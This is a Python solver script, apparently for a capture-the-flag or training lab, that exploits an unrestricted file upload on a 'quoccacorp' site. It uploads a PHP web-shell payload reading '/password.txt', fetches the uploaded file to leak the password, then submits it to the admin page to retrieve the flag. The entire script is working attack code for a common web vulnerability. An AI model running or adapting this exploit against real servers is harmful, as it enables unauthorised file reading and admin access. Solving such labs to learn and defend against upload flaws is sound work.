import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

import io

# https://portswigger.net/web-security/file-upload#:~:text=%3C%3Fphp%20echo%20file_get_contents(%27/path/to/target/file%27)%3B%20%3F%3E

BASE_URL = "https://php-up.quoccacorp.com"
FILENAME = "php_up.web_shell.php"
PAYLOAD = "<?php echo file_get_contents('/password.txt'); ?>"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        file_object = io.BytesIO(PAYLOAD.encode())
        response = self.session.post(f"{BASE_URL}/upload.php", files={"file": (FILENAME, file_object)})

        response = self.session.get(f"{BASE_URL}/uploads/{FILENAME}")
        password = response.text.strip()

        response = self.session.post(f"{BASE_URL}/admin.php", data={"pass": password})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()